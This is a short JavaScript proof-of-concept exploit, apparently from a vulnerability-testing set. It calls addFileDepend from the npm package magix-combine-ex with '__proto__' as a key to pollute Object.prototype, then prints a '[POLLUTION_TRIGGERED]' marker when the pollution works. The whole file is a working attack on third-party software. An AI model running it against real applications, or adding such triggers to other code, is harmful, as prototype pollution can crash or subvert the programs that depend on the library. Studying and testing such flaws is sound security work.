// Exploit the vulnerability using the given script template
const riskyPrototype = '__proto__';
const riskyName = 'polluted';
const dependTo = 'someDependency';

require("magix-combine-ex/plugins/util-deps").addFileDepend(riskyPrototype, riskyName, dependTo);

// Check if the prototype pollution was successful
console.log({}.polluted !== undefined ? '[POLLUTION_TRIGGERED]':'');